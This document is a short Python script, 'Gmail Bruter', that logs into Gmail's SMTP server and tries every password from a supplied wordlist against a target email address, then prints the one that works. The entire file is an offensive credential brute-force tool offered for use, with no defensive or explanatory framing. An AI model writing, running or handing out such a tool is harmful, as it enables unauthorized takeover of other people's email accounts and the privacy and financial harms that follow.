import smtplib
import os

print("""
                                _________________________________________________
                               |=================================================|
                               |            [Author => Mohamed Dief]             |
                               |=================================================|
                               |              ++++++++++++++++++++               |
                               |             +    Gmail  Bruter   +              |
                               |              ++++++++++++++++++++               |
                               |                                                 |
                               |[+]Github: github.com/DEMON1A                    |
                               |[+]Facebook: www.facebook.com/mohamed.dief.1029  |
                               |[+]Twitter: twitter.com/Demon77098812            |
                               |_________________________________________________|
""")

print(" ")

smtpserver = smtplib.SMTP('smtp.gmail.com', 587)
smtpserver.ehlo()
smtpserver.starttls()

Email = input("[*]Enter Email Adress: ")
PWF = input("[*]Enter Password List Name: ")
PWF = open(PWF, "r")

print(" ")
print("[*]Start Brute Force!")

for Password in PWF:
    try:
        smtpserver.login(Email, Password)
        print("[+]Password Found: {0}".format(Password))
        os.system("clear")
        print("++++++++++++++++++++++++++++++++++++++++++++++++")
        print(" ")
        print("[+]Email Is {0}".format(Email))
        print("[+]Password Is {0}".format(Password)) 
        print(" ")
        print("[*]Done")
        print("++++++++++++++++++++++++++++++++++++++++++++++++")
        break
    except smtplib.SMTPAuthenticationError:
        print("[!]Password Not Found: {0}".format(Password))
#By Mohamed Dief*
#Note : Put The WordList In The Same Folder With The Script And Enter The WordList Name With .txt
        
